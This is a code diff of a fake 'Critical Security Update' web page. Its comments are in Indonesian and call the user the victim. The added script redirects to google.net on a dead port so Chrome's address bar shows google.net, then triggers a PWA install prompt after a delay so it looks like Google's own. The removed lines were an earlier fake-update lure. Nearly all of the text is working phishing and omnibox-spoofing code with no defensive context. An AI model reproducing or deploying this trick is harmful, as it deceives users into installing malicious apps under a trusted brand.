@@ -5,49 +5,37 @@
 <link rel="manifest" href="manifest.json">
 <style>
   body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
-  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; }
-  #status { color: #9aa0a6; margin-bottom: 30px; font-size: 14px;}
+  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; display: none; }
 </style>
 </head>
 <body>
-  <h2>System Update Required</h2>
-  <p id="status">Scanning device compatibility...</p>
-  
-  <!-- Tombol ini cuma muncul kalo Chrome ngizinin instalasi -->
-  <button class="btn" id="installBtn">Install Security Update</button>
+  <h2>Critical Security Update</h2>
+  <button class="btn" id="installBtn">Update Now</button>
 
 <script>
 let deferredPrompt;
 const installBtn = document.getElementById('installBtn');
-const statusText = document.getElementById('status');
 
-// Chrome mendeteksi manifest.json dan ngasih lampu hijau buat install
 window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     deferredPrompt = e;
-    
-    // Munculin tombol eksekusi
     installBtn.style.display = 'block';
-    statusText.innerText = "Device compatible. Ready to install.";
 });
 
-// Aksi ketika korban klik tombol
-installBtn.addEventListener('click', async () => {
-    if (deferredPrompt) {
-        deferredPrompt.prompt();
-        const { outcome } = await deferredPrompt.userChoice;
-        if (outcome === 'accepted') {
-            statusText.innerText = "Installation prompt triggered successfully!";
-            installBtn.style.display = 'none';
+installBtn.addEventListener('click', () => {
+    // 1. OMNIBOX SPOOFING: Arahkan ke Google.net tapi di port yang MATI (misal port 81)
+    // Chrome akan mencoba loading, Address Bar langsung berubah jadi "Google.net"
+    window.location.href = "https://google.net:81";
+    
+    // 2. Selagi Chrome nge-freeze nungguin port 81, kita tembak UI Install PWA-nya!
+    setTimeout(async () => {
+        if (deferredPrompt) {
+            deferredPrompt.prompt();
+            // Sekarang korban melihat Address Bar "Google.net" DAN popup instalasi berlogo Google!
+            deferredPrompt = null;
         }
-        deferredPrompt = null;
-    }
+    }, 1500); // Delay 1.5 detik nunggu Address Bar Chrome update
 });
-
-// Cek kalau lu lupa uninstall dari HP
-if (window.matchMedia('(display-mode: standalone)').matches) {
-    statusText.innerHTML = "⚠️ ERROR: WebAPK is already installed on this device.<br>Please uninstall it from your Home Screen to test the prompt again.";
-}
 </script>
 </body>
 </html>
